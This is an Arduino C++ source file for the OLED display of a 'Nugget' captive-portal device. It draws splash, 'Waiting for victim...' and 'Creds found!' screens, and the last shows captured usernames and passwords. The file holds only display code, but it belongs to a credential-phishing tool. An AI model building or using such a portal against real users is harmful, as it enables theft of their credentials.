#include "Arduino.h"
#include "Screen.h"
#include "SH1106.h"
#include "graphics.h"

SH1106Wire display(0x3C, 33, 35);

const char* Screen::sectionText = "NUGGET CAPTIVE PORTAL"; // Define and initialize sectionText

Screen::Screen() {
sectionText = "NUGGET CAPTIVE PORTAL";
}

void Screen::initDisplay() {
  display.init();
  display.flipScreenVertically();
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.setFont(DejaVu_Sans_Mono_10);
}

void Screen::displaySplash(uint8_t sec) {
  display.clear();
  display.drawString(35, 25, "NUGGET AP");
  display.drawString(52, 40, "@Catzpacho");
  display.drawString(20, 40, "v1.0");
  display.display();
  delay(sec * 1000);
}

void Screen::displayWaitingForVictim() {
  display.clear();
  display.drawXbm(0, 0, 128, 64, reload_bits);
  display.drawString(3, 15, "Waiting for ");
  display.drawString(3, 25, "victim...");
  display.drawLine(0, 53, 127, 53);
  display.drawLine(0, 54, 127, 54);
  display.drawString(0, 54, sectionText);
  display.display();
}

void Screen::displayCredsFound(String username, String password) {
  display.clear();
  display.drawXbm(0, 0, 128, 64, high_signal_bits);
  display.drawString(0, 5, "Creds found!");

  // Process and display the username
  String truncatedUsername = username;
  if (username.length() > 10) {
    truncatedUsername = username.substring(0, 8) + "...";
  }
  display.drawString(0, 20, "U:" + truncatedUsername);

  // Process and display the password
  String truncatedPassword = password;
  if (password.length() > 10) {
    truncatedPassword = password.substring(0, 8) + "...";
  }
  display.drawString(0, 30, "P:" + truncatedPassword);

  display.drawLine(0, 53, 127, 53);
  display.drawLine(0, 54, 127, 54);
  display.drawString(0, 54, sectionText);
  display.display();
}

void Screen::updateSectionText(const char* newText) {
  sectionText = newText;
  display.setColor(BLACK);
  display.fillRect(0, 53, 128, 10);
  display.setColor(WHITE);

  // Draw the new text in the same location
  display.drawString(0, 54, newText);
  display.display();
}
